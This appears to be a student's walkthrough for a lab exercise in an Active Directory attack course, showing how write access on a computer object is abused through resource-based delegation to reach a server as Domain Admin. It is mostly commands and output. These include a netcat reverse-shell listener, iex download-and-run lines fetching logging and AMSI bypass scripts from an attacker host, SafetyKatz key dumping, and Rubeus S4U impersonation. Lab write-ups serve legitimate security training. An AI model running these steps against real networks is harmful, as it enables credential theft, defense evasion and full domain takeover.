# Learning Objetive 17

* Find a computer object in dcorp domain where we have Write permissions.
* Abuse the Write permissions to access that computer as Domain Admin.

***

Let’s use PowerView from a PowerShell session started using Invisi-Shell to enumerate Write permissions for a user that we have compromised.&#x20;

```
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
. C:\AD\Tools\PowerView.ps1
```

After trying from multiple users or using BloodHound we would know <mark style="background-color:yellow;">that the user ciadmin has Write permissions on the computer object of dcorp-mgmt</mark>:

<pre><code>C:\AD\Tools> Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}

ObjectDN                : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
<a data-footnote-ref href="#user-content-fn-1">AceQualifier            : AccessAllowed</a>
ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-719815819-3726368948-3917688648-1121
IdentityReferenceName   : ciadmin
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=ci admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass  : user
</code></pre>

> Recall that we compromised ciadmin from dcorp-ci.&#x20;

We can either use the reverse shell we have on dcorp-ci as ciadmin or extract the credentials from dcorp-ci.&#x20;

Let’s use the reverse shell (Jenkins) that we have and load PowerView there:

> Remember do the bypass in it machine (sblogin, amsi, etc...)

```
C:\Users\studentx> C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
listening on [any] 443 ...
connect to [172.16.100.1] from (UNKNOWN) [172.16.3.11] 51192: NO_DATA

[snip]

PS C:\Users\Administrator\.jenkins\workspace\projectx> iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/sbloggingbypass.txt')
PS C:\Users\Administrator\.jenkins\workspace\projectx> iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/Amsi-Byp.txt')
PS C:\Users\Administrator\.jenkins\workspace\projectx> iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/PowerView.ps1')
```

Now, configure RBCD on dcorp-mgmt for the student VMs.&#x20;

You may like to set it for all the student VMs in your lab instance so that your fellow students can also abuse RBCD:

Your student VM hostname could be dcorp-studentX or dcorp-stdX.

```
PS C:\Users\Administrator\.jenkins\workspace\projectx> Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std453$' -Verbose
```

> Change; dcorp-student453$ to dcorp-std453$ (now us users has it names)

Check if RBCD is set correctly:

> If it dosent worked, its likely to be we didnt do the before step well

```
PS C:\Users\Administrator\.jenkins\workspace\projectx> Get-DomainRBCD

SourceName                 : DCORP-MGMT$
SourceType                 : MACHINE_ACCOUNT
SourceSID                  : S-1-5-21-719815819-3726368948-3917688648-1108
SourceAccountControl       : WORKSTATION_TRUST_ACCOUNT
SourceDistinguishedName    : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
ServicePrincipalName       : {WSMAN/dcorp-mgmt, WSMAN/dcorp-mgmt.dollarcorp.moneycorp.local, TERMSRV/DCORP-MGMT,
                             TERMSRV/dcorp-mgmt.dollarcorp.moneycorp.local...}
DelegatedName              : DCORP-studentx$
DelegatedType              : MACHINE_ACCOUNT
DelegatedSID               : S-1-5-21-719815819-3726368948-3917688648-4110
DelegatedAccountControl    : WORKSTATION_TRUST_ACCOUNT
DelegatedDistinguishedName : CN=DCORP-studentx,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local

[snip]
```

Get AES keys <mark style="background-color:yellow;">of your student VM</mark> (as we configured RBCD for it above). Run the below command from an elevated shell:

```
C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"

[snip]

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-STD453$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 4/12/2026 5:04:09 AM
SID               : S-1-5-18

         * Username : dcorp-std453$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       5c805d75e761664230108bb332ae7835310b48b3636368ca74a09e94a470286c
           rc4_hmac_nt       0f541b805d8d6a548ed75ce06e850469
           rc4_hmac_old      0f541b805d8d6a548ed75ce06e850469
           rc4_md4           0f541b805d8d6a548ed75ce06e850469
           rc4_hmac_nt_exp   0f541b805d8d6a548ed75ce06e850469
           rc4_hmac_old_exp  0f541b805d8d6a548ed75ce06e850469

[snip]
```

> dcorp-std453$:
>
> 5c805d75e761664230108bb332ae7835310b48b3636368ca74a09e94a470286c

With Rubeus, abuse the RBCD to access `dcorp-mgmt` as Domain Administrator - Administrator:

```
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-std453$ /aes256:5c805d75e761664230108bb332ae7835310b48b3636368ca74a09e94a470286c /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
[snip]

[*] Impersonating user 'administrator' to target SPN 'http/dcorp-mgmt'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)

[snip]
```

Check if we can access dcorp-mgmt:

```
C:\Windows\system32> winrs -r:dcorp-mgmt cmd
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator.dcorp> set username

Set username
USERNAME = administrator

C:\Users\Administrator.dcorp> set computername

Set computername
COMPUTERNAME=dcorp-mgmt
```



[^1]: 
